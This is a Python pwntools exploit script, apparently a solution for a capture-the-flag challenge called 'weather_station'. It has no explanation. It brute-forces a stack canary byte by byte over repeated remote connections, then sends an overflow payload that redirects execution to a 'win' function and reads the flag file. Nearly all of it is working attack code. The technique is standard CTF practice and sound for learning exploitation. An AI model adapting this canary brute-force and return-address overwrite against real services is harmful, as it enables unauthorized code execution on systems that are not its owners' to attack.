#!/usr/bin/env python3
from pwn import *

host, port = 'offsec.m0lecon.it', 13586
#host, port = '127.0.0.1', 5555
canary_offset = 56
rip_offset = 72

elf = ELF('./weather_station', checksec=False)
context.binary = elf 



known = b"\x00"

for i in range(7): 
    found = False

    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * canary_offset + guess

        io = remote(host, port, level='error')
        io.recvuntil(b"Enter your location: ")
        io.sendline(b"A")

        io.recvuntil(b"Submit your forecast query: ")
        io.send(payload)

        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"Forecast sent!\n" in data:
            known = guess
            print(f"[+] byte {i+1}: {bval:02x}")
            found = True
            break
    if not found:
        print(f"[-] failed to recover byte {i+1}")
        exit()

canary = u64(known)
print(f"[+] Canary: {canary:#x}")

io = remote(host, port)
io.recvuntil(b"Enter your location: ")
io.sendline(b"A")
io.recvuntil(b"Submit your forecast query: ")

payload = flat(
    b"A" * canary_offset,
    p64(canary),
    b"B" * (rip_offset - canary_offset - 8),
    p64(elf.sym.win)
)
io.send(payload)
io.sendline("cat home/user/flag")
io.interactive()
